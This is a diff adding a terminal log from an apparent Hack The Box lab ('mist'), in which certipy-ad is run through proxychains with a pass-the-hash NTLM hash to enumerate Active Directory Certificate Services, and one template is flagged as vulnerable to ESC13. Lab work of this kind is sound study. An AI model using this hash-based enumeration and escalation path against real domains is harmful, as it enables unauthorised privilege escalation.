@@ -1,0 +1,100 @@
+┌──(usuario㉿kali)-[~/HTB/mist/content/scripts]
+└─$ proxychains4 -q certipy-ad find -u svc_cabackup -hashes :c9872f1bc10bdd522c12fc2ac9041b64 -vulnerable -stdout -dc-ip 192.168.100.100
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 37 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 14 enabled certificate templates
+[*] Finding issuance policies
+[*] Found 20 issuance policies
+[*] Found 2 OIDs linked to templates
+[!] DNS resolution failed: The resolution lifetime expired after 5.412 seconds: Server Do53:192.168.100.100@53 answered The DNS operation timed out.; Server Do53:192.168.100.100@53 answered The DNS operation timed out.; Server Do53:192.168.100.100@53 answered The DNS operation timed out.
+[!] Use -debug to print a stacktrace
+[*] Retrieving CA configuration for 'mist-DC01-CA' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Successfully retrieved CA configuration for 'mist-DC01-CA'
+[*] Checking web enrollment for CA 'mist-DC01-CA' @ 'DC01.mist.htb'
+[!] Error checking web enrollment: [Errno 111] Connection refused
+[!] Use -debug to print a stacktrace
+[!] Error checking web enrollment: [Errno 111] Connection refused
+[!] Use -debug to print a stacktrace
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : mist-DC01-CA
+    DNS Name                            : DC01.mist.htb
+    Certificate Subject                 : CN=mist-DC01-CA, DC=mist, DC=htb
+    Certificate Serial Number           : 3BF0F0DDF3306D8E463B218B7DB190F0
+    Certificate Validity Start          : 2024-02-15 15:07:23+00:00
+    Certificate Validity End            : 2123-02-15 15:17:23+00:00
+    Web Enrollment
+      HTTP
+        Enabled                         : False
+      HTTPS
+        Enabled                         : False
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+    Permissions
+      Owner                             : MIST.HTB\Administrators
+      Access Rights
+        ManageCa                        : MIST.HTB\Administrators
+                                          MIST.HTB\Domain Admins
+                                          MIST.HTB\Enterprise Admins
+        ManageCertificates              : MIST.HTB\Administrators
+                                          MIST.HTB\Domain Admins
+                                          MIST.HTB\Enterprise Admins
+        Enroll                          : MIST.HTB\Authenticated Users
+Certificate Templates
+  0
+    Template Name                       : ManagerAuthentication
+    Display Name                        : ManagerAuthentication
+    Certificate Authorities             : mist-DC01-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : False
+    Certificate Name Flag               : SubjectAltRequireUpn
+                                          SubjectRequireCommonName
+    Enrollment Flag                     : IncludeSymmetricAlgorithms
+                                          PublishToDs
+                                          AutoEnrollment
+    Private Key Flag                    : ExportableKey
+    Extended Key Usage                  : Server Authentication
+                                          Encrypting File System
+                                          Secure Email
+                                          Client Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 2
+    Validity Period                     : 99 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 4096
+    Template Created                    : 2024-02-21T12:19:50+00:00
+    Template Last Modified              : 2024-02-21T13:53:35+00:00
+    Issuance Policies                   : 1.3.6.1.4.1.311.21.8.5839708.6945465.11485352.4768789.12323346.226.6538420.14514029
+    Linked Groups                       : CN=Certificate Managers,CN=Users,DC=mist,DC=htb
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : MIST.HTB\Certificate Services
+                                          MIST.HTB\Domain Admins
+                                          MIST.HTB\Enterprise Admins
+      Object Control Permissions
+        Owner                           : MIST.HTB\Administrator
+        Full Control Principals         : MIST.HTB\Domain Admins
+                                          MIST.HTB\Enterprise Admins
+        Write Owner Principals          : MIST.HTB\Domain Admins
+                                          MIST.HTB\Enterprise Admins
+        Write Dacl Principals           : MIST.HTB\Domain Admins
+                                          MIST.HTB\Enterprise Admins
+        Write Property Enroll           : MIST.HTB\Domain Admins
+                                          MIST.HTB\Enterprise Admins
+    [+] User Enrollable Principals      : MIST.HTB\Certificate Services
+    [!] Vulnerabilities
+      ESC13                             : Template allows client authentication and issuance policy is linked to group 'CN=Certificate Managers,CN=Users,DC=mist,DC=htb'.
+
